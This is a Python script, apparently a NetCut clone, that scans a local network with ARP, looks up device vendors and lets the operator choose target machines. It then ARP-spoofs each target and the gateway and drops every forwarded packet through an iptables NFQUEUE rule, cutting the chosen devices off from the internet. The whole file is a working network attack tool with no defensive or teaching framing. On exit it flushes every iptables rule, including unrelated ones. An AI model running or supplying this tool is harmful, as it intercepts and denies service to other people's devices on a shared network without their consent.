#! /usr/bin/python3

import scapy.all as scapy
import os
import subprocess
import netifaces
import requests
import netfilterqueue
import threading
import sys
import time
from termcolor import colored
from bs4 import BeautifulSoup


def has_root():
    return os.geteuid() == 0


def gateway_address():
    gateways = netifaces.gateways()
    default_address = gateways["default"][netifaces.AF_INET][0]
    return default_address


def connected_clients(gateway_address, ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients = []
    for client in response:
        client_info = {"ip" : client[1].psrc, "mac" : client[1].src}
        clients.append(client_info)
    updated_clients = get_vendor_info(clients)
    return updated_clients


def get_vendor_info(clients):
	query = "https://www.ipchecktool.com/tool/macfinder?oui="
	for client in clients:
		url = query + client["mac"].replace(':', "%3A")
		response = requests.get(url)
		soup = BeautifulSoup(response.text, 'html.parser')
		tag = soup.find("table", {"class":"table"})
		info = tag.find_all('td')
		vendor = info[1].text
		client["vendor"] = vendor
	return clients


class ARPSpoof:
    def __init__(self, target, ip_range, gateway):
        self._to_spoof = False
        self.target = target
        self.gateway = gateway

    def send_spoof_packet(self, target, spoof_ip):
        packet = scapy.ARP(
            op=2,
            pdst=target["ip"],
            hwdst=target["mac"],
            psrc=spoof_ip
        )
        scapy.send(packet, verbose=False)

    def send_unspoof_packet(self, target, source):
        packet = scapy.ARP(
            op=2,
            pdst=target["ip"],
            hwdst=target["mac"],
            psrc=source["ip"],
            hwsrc=source["mac"]
        )
        scapy.send(packet, verbose=False)

    def start(self, threaded=True):
        self._to_spoof = True
        if threaded:
            t = threading.Thread(target=self._start)
            t.start()
            return t
        else:
            self._start()

    def _start(self):
        while True:
            if not self._to_spoof:
                break
            self.send_spoof_packet(self.target, self.gateway["ip"])
            self.send_spoof_packet(self.gateway, self.target["ip"])
            time.sleep(1)

    def stop(self):
        self._to_spoof = False
        time.sleep(1)
        self.send_unspoof_packet(self.target, self.gateway)
        self.send_unspoof_packet(self.gateway, self.target)


def prompt_for_targets(clients):
    for i, client in enumerate(clients, 1):
        info = "[{index}]\t{ip_addr}\t{mac_addr}\t{vendor}".format(
            index=i,
            ip_addr=client["ip"],
            mac_addr=client["mac"],
            vendor=client["vendor"]
        )
        print(colored(info, "cyan"))

    indices = input(colored("NetCut>", "red", attrs=["bold"]))
    if not indices:
        return []
    indices = map(int, indices.split(","))
    targets = [clients[index-1] for index in indices]
    return targets


class InternetControl:
    def __init__(self):
        self.targets = []

    def add_target(self, target):
        self.targets.append(target)

    def deny(self, threaded=True):
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, lambda packet: packet.drop())
        for target in self.targets:
            target.start()
        if threaded:
            t = threading.Thread(target=queue.run)
            t.start()
            return t
        else:
            queue.run()

    def restore(self):
        for target in self.targets:
            target.stop()
        subprocess.call(["iptables", "--flush"])


if __name__ == '__main__':
    if not has_root():
        print(colored("[-] Please run as Root... Quitting!!", "red"))
        sys.exit(1)
    print(colored("[+] Running as Root", "green"))
    gateway_ip = gateway_address()
    print(colored("[+] Gateway IP: {}".format(gateway_ip), "red"))

    ip_range = "192.168.1.0/24"
    clients = connected_clients(gateway_ip, ip_range)
    gateway = clients[0]
    targets = prompt_for_targets(clients[1:])
    network = InternetControl()
    for target in targets:
        print(colored("[+] Spoofing Target: {}", "green").format(target["ip"]))
        network.add_target(ARPSpoof(target, ip_range, gateway))
    try:
        network.deny(threaded=False)
    except KeyboardInterrupt:
        pass
    finally:
        network.restore()
